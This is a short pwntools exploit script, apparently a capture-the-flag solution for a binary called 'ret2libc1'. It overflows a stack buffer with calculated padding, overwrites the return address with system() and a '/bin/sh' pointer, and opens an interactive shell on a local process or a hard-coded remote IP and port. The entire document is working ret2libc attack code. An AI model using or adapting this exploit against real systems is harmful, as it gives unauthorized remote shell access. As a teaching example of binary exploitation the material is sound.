from pwn import *
debug = True
#context.log_level = "debug"
sysbinsh = 0x0804863A
if debug:
	io = process("./ret2libc1")
else:
	io = remote("47.75.182.113", 9999)

shellcode = asm(shellcraft.sh())
esp_addr = 0xffffd190
char_addr = esp_addr + 0x1C
ebp_addr = 0xffffd218
char_num = ebp_addr-char_addr
system_addr = 0x08048460
fake_ret = "junk"
binsh = 0x08048720
payload = ""
payload += "A"*char_num
payload += "junk"
payload += p32(system_addr)
payload += "junk"
payload += p32(binsh)
io.sendline(payload)
io.interactive()



